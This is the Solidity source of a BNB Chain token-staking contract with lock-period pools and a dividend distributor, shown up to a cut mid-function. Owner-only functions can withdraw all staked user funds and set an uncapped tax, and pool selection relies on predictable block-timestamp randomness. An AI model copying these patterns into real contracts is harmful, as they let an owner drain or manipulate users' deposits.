/**
 *Submitted for verification at BscScan.com on 2022-08-09
*/

// SPDX-License-Identifier: Unlicensed

pragma solidity ^ 0.8.7;

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function decimals() external view returns (uint8);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function claim() external;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts with custom message when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this;
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;
    address private _previousOwner;
    uint256 private _lockTime;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        _previousOwner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

     /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    function getUnlockTime() public view returns (uint256) {
        return _lockTime;
    }
}

interface IDividendDistributor {
    function setDistributionCriteria(
        uint256 _minPeriod,
        uint256 _minDistribution
    ) external;

    function setShare(address shareholder, uint256 amount, uint poolNo) external;

    function deposit(uint256 amount) external;

    function process(uint256 gas, uint poolNo) external;

    function purge(address receiver, uint256 amount) external;
}

contract DDStakingPool is IDividendDistributor {
    using SafeMath for uint256;

    address public _token;

    struct Share {
        uint256 amount;
        uint256 totalExcluded;
        uint256 totalRealised;
    }

    IERC20 public REWARD;

    address[] shareholders;
    mapping(address => mapping(uint => uint256)) shareholderIndexes;
    mapping(address => mapping(uint => uint256)) shareholderClaims;

    mapping(address => mapping(uint => Share)) public shares;

    uint256 public totalShares;
    uint256 public totalDividends;
    uint256 public totalDistributed;
    uint256 public dividendsPerShare;
    uint256 public dividendsPerShareAccuracyFactor = 10**36;
    mapping(uint => uint256) private totalPoolDistributed;

    uint256 public minPeriod = 30 * 60;
    uint256 public minDistribution = 1 * (10**9);

    uint256 currentIndex;

    bool initialized;
    modifier initialization() {
        require(!initialized);
        _;
        initialized = true;
    }

    modifier onlyToken() {
        require(msg.sender == _token);
        _;
    }

    constructor(address rewardToken) {
        _token = msg.sender;
        REWARD = IERC20(rewardToken);
    }

    receive() external payable {}

    function setDistributionCriteria(
        uint256 _minPeriod,
        uint256 _minDistribution
    ) external override onlyToken {
        minPeriod = _minPeriod;
        minDistribution = _minDistribution;
    }

    function purge(address receiver, uint256 amount) external override onlyToken {
        REWARD.transfer(receiver, amount);
    }

    function setShare(address shareholder, uint256 amount, uint poolNo)
        external
        override
        onlyToken
    {
        if (shares[shareholder][poolNo].amount > 0) {
            distributeDividend(shareholder, poolNo);
        }

        if (amount > 0 && shares[shareholder][poolNo].amount == 0) {
            addShareholder(shareholder, poolNo);
        } else if (amount == 0 && shares[shareholder][poolNo].amount > 0) {
            removeShareholder(shareholder, poolNo);
        }

        totalShares = totalShares.sub(shares[shareholder][poolNo].amount).add(amount);
        shares[shareholder][poolNo].amount = amount;
        shares[shareholder][poolNo].totalExcluded = getCumulativeDividends(
            shares[shareholder][poolNo].amount
        );
    }

    function deposit(uint256 amount) external override onlyToken {
        totalDividends = totalDividends.add(amount);
        dividendsPerShare = dividendsPerShare.add(
            dividendsPerShareAccuracyFactor.mul(amount).div(totalShares)
        );
    }

    function process(uint256 gas, uint poolNo) external override onlyToken {
        uint256 shareholderCount = shareholders.length;

        if (shareholderCount == 0) {
            return;
        }

        uint256 gasUsed = 0;
        uint256 gasLeft = gasleft();

        uint256 iterations = 0;

        while (gasUsed < gas && iterations < shareholderCount) {
            if (currentIndex >= shareholderCount) {
                currentIndex = 0;
            }

            if (shouldDistribute(shareholders[currentIndex], poolNo)) {
                distributeDividend(shareholders[currentIndex], poolNo);
            }

            gasUsed = gasUsed.add(gasLeft.sub(gasleft()));
            gasLeft = gasleft();
            currentIndex++;
            iterations++;
        }
    }

    function shouldDistribute(address shareholder, uint poolNo)
        internal
        view
        returns (bool)
    {
        return
            shareholderClaims[shareholder][poolNo] + minPeriod < block.timestamp &&
            getUnpaidEarnings(shareholder, poolNo) > minDistribution;
    }

    function distributeDividend(address shareholder, uint poolNo) internal {
        if (shares[shareholder][poolNo].amount == 0) {
            return;
        }

        uint256 amount = getUnpaidEarnings(shareholder, poolNo);
        if (amount > 0) {
            totalDistributed = totalDistributed.add(amount);
            totalPoolDistributed[poolNo] = totalPoolDistributed[poolNo].add(amount);
            REWARD.transfer(shareholder, amount);
            shareholderClaims[shareholder][poolNo] = block.timestamp;
            shares[shareholder][poolNo].totalRealised = shares[shareholder][poolNo]
                .totalRealised
                .add(amount);
            shares[shareholder][poolNo].totalExcluded = getCumulativeDividends(
                shares[shareholder][poolNo].amount
            );
        }
    }

    // Harvest Reward Token
    function claimDividend(uint poolNo) external {
        distributeDividend(msg.sender, poolNo);
    }

    function getUnpaidEarnings(address shareholder, uint poolNo)
        public
        view
        returns (uint256)
    {
        if (shares[shareholder][poolNo].amount == 0) {
            return 0;
        }

        uint256 shareholderTotalDividends = getCumulativeDividends(
            shares[shareholder][poolNo].amount
        );
        uint256 shareholderTotalExcluded = shares[shareholder][poolNo].totalExcluded;

        if (shareholderTotalDividends <= shareholderTotalExcluded) {
            return 0;
        }

        return shareholderTotalDividends.sub(shareholderTotalExcluded);
    }

    function getHolderDetails(address holder, uint poolNo)
        public
        view
        returns (
            uint256 lastClaim,
            uint256 unpaidEarning,
            uint256 totalReward,
            uint256 holderIndex
        )
    {
        lastClaim = shareholderClaims[holder][poolNo];
        unpaidEarning = getUnpaidEarnings(holder, poolNo);
        totalReward = shares[holder][poolNo].totalRealised;
        holderIndex = shareholderIndexes[holder][poolNo];
    }

    function getCumulativeDividends(uint256 share)
        internal
        view
        returns (uint256)
    {
        return
            share.mul(dividendsPerShare).div(dividendsPerShareAccuracyFactor);
    }

    function getLastProcessedIndex() external view returns (uint256) {
        return currentIndex;
    }

    function getNumberOfTokenHolders() external view returns (uint256) {
        return shareholders.length;
    }
    
    function getShareHoldersList() external view returns (address[] memory) {
        return shareholders;
    }
    
    function totalDistributedRewards() external view returns (uint256) {
        return totalDistributed;
    }

    function totalDistributedPools(uint poolNo) external view returns(uint256){
        return totalPoolDistributed[poolNo];
    }


    function addShareholder(address shareholder, uint poolNo) internal {
        shareholderIndexes[shareholder][poolNo] = shareholders.length;
        shareholders.push(shareholder);
    }

    function removeShareholder(address shareholder, uint poolNo) internal {
        shareholders[shareholderIndexes[shareholder][poolNo]] = shareholders[shareholders.length - 1];
        shareholderIndexes[shareholders[shareholders.length - 1]][poolNo] = shareholderIndexes[shareholder][poolNo];
        shareholders.pop();
    }
}

contract TESTStaking is Context, Ownable {
    using SafeMath for uint256;

    struct Pool {
        uint8 pool;
        string idx;
        uint256 stakeSize;
        uint256 minStake;
        uint256 apyNoLock;
        uint256 apyFirstLock;
        uint256 apySecondLock;
        uint256 apyThirdLock;
        uint256 apyFourthLock;
    }

    struct Staker {
        address wallet;
        uint poolNo;
        uint256 amount;
        uint256 apyTime;
        uint256 timeStakedFor;
        uint256 stakeTime; 
    }

    struct LockCount {
        uint256 noLockCount;
        uint256 lockCountFirst;
        uint256 lockCountSecond;
        uint256 lockCountThird;
        uint256 lockCountFourth;
        uint256 noLockTotal;
        uint256 lockFirstTotal;
        uint256 lockSecondTotal;
        uint256 lockThirdTotal;
        uint256 lockFourthTotal;
        uint256 totalInPool;
    }

    uint256 public noLock = 0;
    uint256 public firstLock = 30 days;
    uint256 public secondLock = 60 days;
    uint256 public thirdLock = 90 days;
    uint256 public fourthLock = 120 days;

    IERC20 private _token;
    IERC20 private _rewardToken;
    DDStakingPool public dividendDistributor;
    uint256 distributorGas = 500000;

    mapping(uint => uint256) public poolShare;
    mapping(address => mapping(uint => uint256)) private walletClaimed;
    mapping(address => mapping(uint => uint256)) private walletClaimedRewardToken;
    mapping(uint => uint256) public totalTokenHarvested;
    mapping(uint => uint256) public totalRewardTokenClaimed;
    mapping(uint => uint256) public totalTokenCompounded;
    mapping(address => mapping(uint => bool)) public hasMigrated;

    mapping(address => bool) public isExcludedFromTax;

    mapping(uint => LockCount) lockCounts;



    uint256 public calculationTime = 365 days;
    uint256 public taxPayable = 0;
    bool public isTaxPayable = false;
	
    uint8 constant _decimals = 18;
    uint256 public minThreshold = 100 * 10**_decimals; // 1k token


    mapping(address => mapping(uint => Staker)) public stakers;
    mapping(address => mapping(uint => bool)) private isStaker;
    mapping(uint => Pool) public pools;
    mapping(uint => uint256) public stakingSize;

    mapping(uint => uint256) public tPoolStakedSize;

    uint[] public activePoolsArray;
    event Stake(address indexed wallet, uint pool, uint256 amount);
    event Unstake(address indexed wallet, uint pool, uint256 amount);
    event Harvest(address indexed wallet, uint pool, uint256 amount);
    event Compound(address indexed wallet, uint pool, uint256 amount);
    event PoolUpdated(uint poolNo, uint256 time);
    event RewardTokenWithdraw(address indexed to, uint256 amount);
    address public migrator;
    address public taxAddress;
    bool public openStaking = false;
    bool public canCompound = false;

    modifier onlyStakingIsOpen() {
        require(openStaking, "StakingPool: Staking is not open yet.");
        _;
    }

    modifier onlyMigrator() {
        require(_msgSender() == migrator, "Migrator: caller is not the migrator.");
        _;
    }

    constructor(IERC20 token_, IERC20 rewardToken_) {
        _token = token_;
        _rewardToken = rewardToken_;
        dividendDistributor = new DDStakingPool(address(rewardToken_));
        isExcludedFromTax[_msgSender()] = true;      
    }

    function deployNewPool(uint8 poolNo_, string memory name,  uint256 minStake_, uint256 apyNoLock, uint256 apyFirstLock, uint256 apySecondLock, uint256 apyThirdLock, uint256 apyFourthLock, uint256 maxStakers) public onlyOwner {
        require(pools[poolNo_].pool == 0, "Pool already present.");
        pools[poolNo_] = Pool(poolNo_, name, maxStakers, minStake_, apyNoLock, apyFirstLock, apySecondLock, apyThirdLock, apyFourthLock);
        if(!checkIfPoolInArray(poolNo_)) {
            activePoolsArray.push(poolNo_);
        }
    }

    

    function checkIfPoolInArray(uint poolNo) internal view returns(bool){
        bool isPoolInArray;
        for(uint i; i < activePoolsArray.length; i++){
            if(activePoolsArray[i] == poolNo) {
                isPoolInArray = true;
                break;
            }
        }

        return isPoolInArray;
    }

    function getTokenInfo() public view returns(address, address){
        return (address(_token), address(_rewardToken));
    }

    function updateTokens(IERC20 token_, IERC20 rewardToken_) public onlyOwner {
        _token = token_;
        _rewardToken = rewardToken_;
    }

    function claimDividend() public onlyOwner {
        _token.claim();
    }

    function random() internal returns (uint) {
        uint randomness = uint(keccak256(abi.encodePacked(block.timestamp, msg.sender, block.timestamp))) % 100000;
        uint randomnumber = randomness % activePoolsArray.length;
        
        if(stakingSize[activePoolsArray[randomnumber]] >= pools[activePoolsArray[randomnumber]].stakeSize){
            activePoolsArray[randomnumber] = activePoolsArray[activePoolsArray.length - 1];
            activePoolsArray.pop();
            randomnumber = random();
        }

        return randomnumber;
    }

    function _applyDepositTax(uint256 amount, address from) internal returns (uint256){
        if(!isExcludedFromTax[_msgSender()] && taxAddress != address(0) && taxPayable > 0) {
            uint256 depositTax = amount.mul(taxPayable).div(100);

            if (depositTax > 0) {
                if (address(_token) == from) {
                    _token.transfer(taxAddress, depositTax);
                } else {
                    _token.transferFrom(from, taxAddress, depositTax);
                }
            }

            amount = amount.sub(depositTax);
        }

        return amount;
    }

    //Stake
    function stakeToken(uint256 amount, uint256 apyTime, uint type_) external onlyStakingIsOpen{
        uint poolNo = type_;
        uint ran;
        uint256 initialApy = 0;
        uint256 initialAmount = 0;
        uint256 rAmount = 0;
        bool hasStaked = false;
        
        if(_msgSender() != owner()) {
            require(activePoolsArray.length > 0, "Sorry! All the pools are filled.");
            ran = random();
            poolNo = activePoolsArray[ran]; 
        }

        require(pools[poolNo].pool != 0,"Sorry pool is not set yet.");

        if(pools[poolNo].stakeSize != 0 && _msgSender() != owner()) {
            require(stakingSize[poolNo] < pools[poolNo].stakeSize, "Pool size reached.");
        }

        require(amount >= pools[poolNo].minStake, "Can not be less than minimum staking size.");
        require(_token.allowance(_msgSender(), address(this)) >= amount, "Please approve the amount to spend us.");

        amount = _applyDepositTax(amount, _msgSender());

        _token.transferFrom(_msgSender(), address(this), amount);

        Staker memory staker = stakers[_msgSender()][poolNo];

        hasStaked = isStaker[_msgSender()][poolNo];

        if(staker.amount != 0 && hasStaked) {
            rAmount = calculateReturn(_msgSender(), poolNo);
            initialApy = staker.apyTime;
            initialAmount = staker.amount;
        }

        poolShare[poolNo] += amount;
        amount = amount.add(rAmount);
        staker.wallet = _msgSender();
        staker.poolNo = poolNo;
        staker.amount = staker.amount.add(amount);
        staker.apyTime = staker.apyTime > apyTime ? staker.apyTime : apyTime;
        staker.timeStakedFor = staker.timeStakedFor > block.timestamp ? staker.timeStakedFor : _stakeTimes(apyTime);
        staker.stakeTime = block.timestamp;

        stakers[_msgSender()][poolNo] = staker;

        uint256 rBalance = _rewardToken.balanceOf(address(this));

        if(rBalance >= minThreshold) {
            _rewardToken.transfer(address(dividendDistributor), rBalance);
            dividendDistributor.deposit(rBalance); 
        }
        
        dividendDistributor.setShare(_msgSender(), staker.amount, poolNo);
        
        if(!hasStaked){
            addLockStakeCounter(poolNo, apyTime, amount);
            stakingSize[poolNo] += 1; 
        } else {
            uint256 tAmount = amount.add(initialAmount).sub(rAmount);
            if(initialApy > apyTime) {
                apyTime = initialApy;
            }
            subLockStakeCounter(poolNo, initialApy, initialAmount);
            addLockStakeCounter(poolNo, apyTime, tAmount);
        }

        isStaker[_msgSender()][poolNo] = true;

        if(stakingSize[poolNo] >= pools[poolNo].stakeSize){
            activePoolsArray[ran] = activePoolsArray[activePoolsArray.length - 1];
            activePoolsArray.pop();
        }

        emit Stake(_msgSender(), poolNo, amount);
    }

    function refillStakingPool(uint poolNo_, uint256 amount) external {
        Staker memory staker = stakers[_msgSender()][poolNo_];
        require(staker.amount != 0, "User has no staking");
        require(_token.allowance(_msgSender(), address(this)) >= amount, "Please approve the amount to spend us.");

        amount = _applyDepositTax(amount, _msgSender());

        _token.transferFrom(_msgSender(), address(this), amount);

        subLockStakeCounter(poolNo_, staker.apyTime, staker.amount);
        poolShare[poolNo_] += amount;
        staker.amount = staker.amount.add(amount);
        staker.stakeTime = block.timestamp;
        stakers[_msgSender()][poolNo_] = staker;

        addLockStakeCounter(poolNo_, staker.apyTime, staker.amount);
        uint256 rBalance = _rewardToken.balanceOf(address(this));
        if(rBalance >= minThreshold) {
            _rewardToken.transfer(address(dividendDistributor), rBalance);
            dividendDistributor.deposit(rBalance); 
        }
        
        dividendDistributor.setShare(_msgSender(), staker.amount, poolNo_);
    }

    function _stakeTimes(uint256 apyTime) internal view returns(uint256){
        uint256 stakeTimes;
        if(apyTime == 0) {stakeTimes = block.timestamp;}
        if(apyTime == 1) {stakeTimes = block.timestamp.add(firstLock);}
        if(apyTime == 2) {stakeTimes = block.timestamp.add(secondLock);}
        if(apyTime == 3) {stakeTimes = block.timestamp.add(thirdLock);}
        if(apyTime == 4) {stakeTimes = block.timestamp.add(fourthLock);}
        return stakeTimes;
    }

    function _getLockPeriod(uint256 apyTime_) internal view returns(uint256){
        if(apyTime_ == 1) return firstLock;
        if(apyTime_ == 2) return secondLock;
        if(apyTime_ == 3) return thirdLock;
        if(apyTime_ == 4) return fourthLock;
        return noLock;
    }

    function getUserLockPeriod(address account, uint256 poolNo) external view returns(uint256){
        Staker memory staker = stakers[account][poolNo];
        uint256 lockTime_ = _getLockPeriod(staker.apyTime);
        return staker.stakeTime.add(lockTime_);
    }

    function calculateReturn(address account, uint poolNo) public view returns(uint256 amount){
        
        Staker memory staker = stakers[account][poolNo];
        
        Pool memory pool = pools[poolNo];

        if(staker.amount == 0) return 0;
                
        uint256 apy;
        
        uint256 timeSpan = block.timestamp.sub(staker.stakeTime);

        if(staker.apyTime == 0) {apy = pool.apyNoLock;}
        if(staker.apyTime == 1) {apy = pool.apyFirstLock;}
        if(staker.apyTime == 2) {apy = pool.apySecondLock;}
        if(staker.apyTime == 3) {apy = pool.apyThirdLock;}
        if(staker.apyTime == 4) {apy = pool.apyFourthLock;}

        amount = staker.amount.mul(apy).mul(timeSpan).div(calculationTime).div(10**2);
    }

    // Unstake
    function unstakeToken(uint poolNo) external {
        Staker memory staker = stakers[_msgSender()][poolNo];
        require(staker.amount != 0, "Sorry! you have not staked anything.");
        require(block.timestamp >= staker.stakeTime.add(_getLockPeriod(staker.apyTime)), "Sorry!, staking period not finished.");
        require(isStaker[_msgSender()][poolNo], "Caller is not a staker.");
        uint256 amountToWithdraw = staker.amount;

        if(poolShare[poolNo] >= amountToWithdraw) {
            poolShare[poolNo] = poolShare[poolNo].sub(amountToWithdraw);
        } else {
            poolShare[poolNo] = 0;
        }
    
        _token.transfer(_msgSender(), amountToWithdraw);
        
        _harvestToken(_msgSender(), poolNo);

        dividendDistributor.setShare(_msgSender(), 0, poolNo);

        _updateStakingSize(poolNo);
        isStaker[_msgSender()][poolNo] = false;
        delete(stakers[_msgSender()][poolNo]);
        if(!checkIfPoolInArray(poolNo)){
            activePoolsArray.push(poolNo);
        }
        subLockStakeCounter(poolNo, staker.apyTime, amountToWithdraw);
        emit Unstake(_msgSender(), poolNo, amountToWithdraw);
    }

    // Harvest Farmed Token
    function harvestToken(uint poolNo) public {
        _harvestToken(_msgSender(), poolNo);
    }

    function _harvestToken(address account, uint poolNo) internal {
        Staker memory staker = stakers[account][poolNo];

        require(block.timestamp >= staker.stakeTime.add(_getLockPeriod(staker.apyTime)), "StakingPool: staking period is not over yet.");
        
        uint256 returnAmount = calculateReturn(account, poolNo);

        returnAmount = _applyDepositTax(returnAmount, address(_token));

        stakers[account][poolNo].apyTime = 0;
        stakers[account][poolNo].stakeTime = block.timestamp;

        walletClaimed[account][poolNo] += returnAmount;
        _token.transfer(account, returnAmount);
        poolShare[poolNo] = (poolShare[poolNo] >= returnAmount) ? poolShare[poolNo].sub(returnAmount) : 0;

        totalTokenHarvested[poolNo] = totalTokenHarvested[poolNo].add(returnAmount);

        uint256 rBalance = _rewardToken.balanceOf(address(this));
        
        if(rBalance >= minThreshold) {
            _rewardToken.transfer(address(dividendDistributor), rBalance);
            dividendDistributor.deposit(rBalance);
        }

        emit Harvest(account, poolNo, returnAmount);
    }

    // Compound Farmed Token
    function compoundToken(uint poolNo) public  {
        require(canCompound, "StakingPool: Compound is disabled.");
        Staker memory staker = stakers[_msgSender()][poolNo];
        require(staker.amount > 0, "Sorry! you have not staked anything.");
        //require(block.timestamp >= staker.stakeTime.add(_getLockPeriod(staker.apyTime)), "StakingPool: Staking period is not over yet.");
        uint256 returnAmount = calculateReturn(_msgSender(), poolNo);

        returnAmount = _applyDepositTax(returnAmount, address(_token));

        subLockStakeCounter(poolNo, staker.apyTime, staker.amount);

        staker.amount += returnAmount;
        staker.stakeTime = block.timestamp;
        //staker.apyTime = 0;
        stakers[_msgSender()][poolNo] = staker;

        poolShare[poolNo] += returnAmount;
        
        addLockStakeCounter(poolNo, staker.apyTime, staker.amount);

        uint256 rBalance = _rewardToken.balanceOf(address(this));
        
        dividendDistributor.setShare(_msgSender(), staker.amount, poolNo);
        
        if(rBalance >= minThreshold) {
            _rewardToken.transfer(address(dividendDistributor), rBalance);
            dividendDistributor.deposit(rBalance); 
        }


        totalTokenCompounded[poolNo] = totalTokenCompounded[poolNo].add(returnAmount);
        emit Compound(_msgSender(), poolNo, returnAmount);
    }

    function updatePool(uint8 poolNo_, string memory idx_, uint256 stakeSize_, uint256 minStake_, uint256 apyNoLock_, uint256 apyFirstLock_, uint256 apySecondLock_, uint256 apyThirdLock_, uint256 apyFourthLock_) public onlyOwner {
        Pool memory pool = pools[poolNo_];
        
        pool.pool = poolNo_;
        pool.idx = idx_;
        pool.stakeSize = stakeSize_;
        pool.minStake = minStake_;
        pool.apyNoLock = apyNoLock_;
        pool.apyFirstLock = apyFirstLock_;
        pool.apySecondLock = apySecondLock_;
        pool.apyThirdLock = apyThirdLock_;
        pool.apyFourthLock = apyFourthLock_;

        if(stakeSize_ > pools[poolNo_].stakeSize) {
            if(!checkIfPoolInArray(poolNo_)){
                activePoolsArray.push(poolNo_);
            }
        }
        
        pools[poolNo_] = pool;
        emit PoolUpdated(poolNo_, block.timestamp);
    }

    function updateStakeSize(uint8 poolNo_, uint256 stakeSize_) external onlyOwner {
        Pool memory pool = pools[poolNo_];
        pool.stakeSize = stakeSize_;
        pools[poolNo_] = pool;
    }

    function updatePoolMinStakeAmoun(uint8 poolNo_, uint256 amount_) external onlyOwner {
        Pool memory pool = pools[poolNo_];
        pool.minStake = amount_;
        pools[poolNo_] = pool;
    }

    function updatePoolApys(uint8 poolNo_, uint256 apyNoLock_, uint256 apyFirstLock_, uint256 apySecondLock_, uint256 apyThirdLock_, uint256 apyFourthLock_) external onlyOwner {
        Pool memory pool = pools[poolNo_];
        pool.apyNoLock = apyNoLock_;
        pool.apyFirstLock = apyFirstLock_;
        pool.apySecondLock = apySecondLock_;
        pool.apyThirdLock = apyThirdLock_;
        pool.apyFourthLock = apyFourthLock_;
        pools[poolNo_] = pool;
    }

    function totalStakers(uint poolNo) public view returns(uint256){
        return stakingSize[poolNo];
    }

    function isWalletStaker(address account, uint poolNo) external view returns(bool) {
        return isStaker[account][poolNo];
    }

    function _updateStakingSize(uint poolNo) internal {
        if(stakingSize[poolNo] >=1 ) {
            stakingSize[poolNo] = stakingSize[poolNo] - 1;
        }
    }
    
    function sendToken(address recipient, uint256 amount) public onlyOwner {
        _token.transfer(recipient, amount);
    }

    function claimToken(address recipient, uint256 amount) public onlyOwner {
        _rewardToken.transfer(recipient, amount);
    }

    function claimBNB(address payable account) public onlyOwner {
        account.transfer(address(this).balance);
    }

    function totalPoolStakers(uint poolNo) public view returns(uint256){
        return stakingSize[poolNo];
    }

    function totalTokenHarvestedByWallet(address account, uint poolNo) public view returns(uint256){
        return walletClaimed[account][poolNo];
    }

    function getStakerInfo(address account, uint poolNo) public view returns(Staker memory) {
        return stakers[account][poolNo];
    }

    function isReturnClaimable(address account, uint poolNo) public view returns(bool isTokenClaimable) {
        isTokenClaimable = _token.balanceOf(address(this)) >= calculateReturn(account, poolNo);
    }

    function updateTaxPayable(uint256 newTax) public onlyOwner {
        taxPayable = newTax;
    }

    function updateIsTaxPayable(bool payable_) public onlyOwner {
        isTaxPayable = payable_;
    }

    function updateMinThreshold(uint256 newThreshold) public onlyOwner {
        minThreshold = newThreshold;
    }

    function distributeDividends() public onlyOwner {
        uint256 rBalance = _rewardToken.balanceOf(address(this));
        _rewardToken.transfer(address(dividendDistributor), rBalance);
        dividendDistributor.deposit(rBalance); 
    }

    function purgeRewardToken(address recipient, uint256 amount) public onlyOwner {
        dividendDistributor.purge(recipient, amount);
    }

    function updateStakingPeriods(uint256 firstLock_, uint256 secondLock_, uint256 thirdLock_, uint256 fourthLock_) external onlyOwner {
        require(firstLock_ <= 30 days, "StakingPool: should be less than 30 days");
        require(secondLock_ <= 60 days, "StakingPool: should be less than 60 days");
        require(thirdLock_ <= 90 days, "StakingPool: should be less than 90 days");
        require(fourthLock_ <= 120 days, "StakingPool: should be less than 120 days");
        firstLock = firstLock_;
        secondLock = secondLock_;
        thirdLock = thirdLock_;
        fourthLock = fourthLock_;
    }

    function activePoolsCount() public view returns(uint256){
        return activePoolsArray.length;
    }

    function addLockStakeCounter(uint poolNo, uint256 apy, uint256 amount) internal {
        LockCount memory lockCount = lockCounts[poolNo];
        if(apy == 0) { lockCount.noLockCount += 1; lockCount.noLockTotal += amount; }
        if(apy == 1) { lockCount.lockCountFirst += 1; lockCount.lockFirstTotal += amount;}
        if(apy == 2) { lockCount.lockCountSecond += 1; lockCount.lockSecondTotal += amount;}
        if(apy == 3) { lockCount.lockCountThird += 1; lockCount.lockThirdTotal += amount;}
        if(apy == 4) { lockCount.lockCountFourth += 1; lockCount.lockFourthTotal += amount;}
        lockCount.totalInPool += amount;
        lockCounts[poolNo] = lockCount;
    }

    function updateLockCount(uint poolNo, uint256 initialApy, uint256 apy, uint256 initialAmount, uint256 amount) internal {
        if(initialApy > apy) {
            apy = initialApy;
        }
        subLockStakeCounter(poolNo, initialApy, initialAmount);
        addLockStakeCounter(poolNo, apy, amount.add(initialAmount));
    }

    function subLockStakeCounter(uint poolNo, uint256 apy, uint256 amount) internal {
        LockCount memory lockCount = lockCounts[poolNo];
        if(apy == 0) { lockCount.noLockCount = (lockCount.noLockCount != 0) ? lockCount.noLockCount.sub(1): 0; lockCount.noLockTotal = (lockCount.noLockTotal >= amount) ? lockCount.noLockTotal.sub(amount) : 0; }
        if(apy == 1) { lockCount.lockCountFirst = (lockCount.lockCountFirst != 0) ? lockCount.lockCountFirst.sub(1): 0; lockCount.lockFirstTotal = (lockCount.lockFirstTotal >= amount) ? lockCount.lockFirstTotal.sub(amount): 0; }
        if(apy == 2) { lockCount.lockCountSecond = (lockCount.lockCountSecond != 0) ? lockCount.lockCountSecond.sub(1) : 0; lockCount.lockSecondTotal = (lockCount.lockSecondTotal >= amount) ? lockCount.lockSecondTotal.sub(amount): 0; }
        if(apy == 3) { lockCount.lockCountThird = (lockCount.lockCountThird != 0) ? lockCount.lockCountThird.sub(1) : 0; lockCount.lockThirdTotal = (lockCount.lockThirdTotal >= amount) ? lockCount.lockThirdTotal.sub(amount): 0; }
        if(apy == 4) { lockCount.lockCountFourth = (lockCount.lockCountFourth != 0) ? lockCount.lockCountFourth.sub(1) : 0; lockCount.lockFourthTotal = (lockCount.lockFourthTotal >= amount) ? lockCount.lockFourthTotal.sub(amount): 0; }
        
        lockCount.totalInPool = (lockCount.totalInPool >= amount) ? lockCount.totalInPool.sub(amount) : 0;
        lockCounts[poolNo] = lockCount;
    }

    function getTotalLockCount() public view returns(LockCount memory lockCountTotal) {
        
        for(uint i = 1; i <= 5; i++) {
            LockCount memory lockCount = lockCounts[i];
            lockCountTotal.noLockCount += lockCount.noLockCount;
            lockCountTotal.lockCountFirst += lockCount.lockCountFirst;
